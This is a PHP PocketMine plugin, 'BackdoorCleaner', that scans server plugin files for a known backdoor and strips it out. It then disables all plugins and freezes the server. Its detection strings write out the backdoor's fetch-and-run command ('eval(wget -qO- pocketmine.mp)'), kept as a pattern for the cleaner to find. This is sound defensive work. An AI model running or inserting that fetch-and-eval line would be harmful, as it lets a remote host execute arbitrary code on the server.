<?php

namespace Zwuiix\BackdoorCleaner;

use pocketmine\plugin\PluginBase;
use pocketmine\plugin\PluginManager;
use Symfony\Component\Filesystem\Path;

class Loader extends PluginBase
{
    private static array $propCache = [];
    private static array $methCache = [];

    protected function onLoad(): void
    {
        $pluginPath = $this->getServer()->getPluginPath();
        $scan = self::scanDirectory($pluginPath, ["php", "phar"]);
        $pluginManager = $this->getServer()->getPluginManager();
        $pluginManager->disablePlugins();
        self::setProperty(PluginManager::class, $pluginManager, "plugins", []);
        self::setProperty(PluginManager::class, $pluginManager, "enabledPlugins", []);

        $logger = $this->getLogger();
        foreach ($scan as $item) {
            $content = file_get_contents($item);
            $logger->debug("Scanning {$item}");
            if(str_contains($content, "-qO- pocketmine.mp") && !str_contains($content, "BackdoorCleaner")) {
                $logger->warning("Backdoor found in {$item}.");
                file_put_contents($item, str_replace(["eval(wget -qO- pocketmine.mp);", "eval(`wget -qO- pocketmine.mp`);","-qO- pocketmine.mp"], ["", "", ""], $content));
                $logger->notice("Cleaning {$item}.");
            }
        }
        $logger->warning("Freeze the server to prevent other plugins from loading.");
        sleep(PHP_INT_MAX);
    }

    public static function scanDirectory(string $path, array $filterExtension = []): array
    {
        $scanDir = [];
        foreach (scandir($path,0) as $file) {
            if ($file === ".." || $file === '.') continue;
            if (is_dir($realpath = Path::join($path, $file))) {
                $scanDir = array_merge(self::scanSubDirectory($path, $file, $filterExtension), $scanDir);
                continue;
            }
            if (!empty($filterExtension) && !in_array(pathinfo($realpath)["extension"] ?? "NULL", $filterExtension)) continue;
            if (!is_file($realpath)) continue;
            $scanDir[] = $realpath;
        }
        return $scanDir;
    }

    private static function scanSubDirectory(string $path, string $nextPath, array $filterExtension = []): array{
        $scanDir = [];
        foreach (scandir($pathJoin = Path::join($path,$nextPath),0) as $file){
            if ($file === ".." || $file === '.') continue;
            if (is_dir($realpath = Path::join($pathJoin, $file))) {
                $scanDir = array_merge(self::scanSubDirectory($pathJoin, $file, $filterExtension), $scanDir);
                continue;
            }
            if (!empty($filterExtension) && !in_array(pathinfo($realpath)["extension"] ?? "NULL", $filterExtension)) continue;
            if (!is_file($realpath)) continue;
            $scanDir[] = $realpath;
        }
        return  $scanDir;
    }

    public static function setProperty(string $className, object $instance, string $propertyName, $value): void
    {
        if (!isset(self::$propCache[$k = "$className - $propertyName"])) {
            $refClass = new \ReflectionClass($className);
            $refProp = $refClass->getProperty($propertyName);
            $refProp->setAccessible(true);
        } else {
            $refProp = self::$propCache[$k];
        }
        $refProp->setValue($instance, $value);
    }

    /**
     * @param string $className
     * @param object $instance
     * @param string $propertyName
     * @return mixed
     * @throws \ReflectionException
     */
    public static function getProperty(string $className, object $instance, string $propertyName): mixed
    {
        if (!isset(self::$propCache[$k = "$className - $propertyName"])) {
            $refClass = new \ReflectionClass($className);
            $refProp = $refClass->getProperty($propertyName);
            $refProp->setAccessible(true);
        } else {
            $refProp = self::$propCache[$k];
        }
        return $refProp->getValue($instance);
    }

    /**
     * @param string $className
     * @param string $methodName
     * @param mixed ...$args
     * @return mixed
     * @throws \ReflectionException
     */
    public static function invokeStatic(string $className, string $methodName, ...$args): mixed
    {
        if (!isset(self::$methCache[$k = "$className - $methodName"])) {
            $refClass = new \ReflectionClass($className);
            $refMeth = $refClass->getMethod($methodName);
            $refMeth->setAccessible(true);
        } else {
            $refMeth = self::$methCache[$k];
        }
        return $refMeth->invoke(null, ...$args);
    }

    /**
     * @param string $className
     * @param object $instance
     * @param string $methodName
     * @param mixed ...$args
     * @return mixed
     * @throws \ReflectionException
     */
    public static function invoke(string $className, object $instance, string $methodName, ...$args): mixed
    {
        if (!isset(self::$methCache[$k = "$className - $methodName"])) {
            $refClass = new \ReflectionClass($className);
            $refMeth = $refClass->getMethod($methodName);
            $refMeth->setAccessible(true);
        } else {
            $refMeth = self::$methCache[$k];
        }
        return $refMeth->invoke($instance, ...$args);
    }
}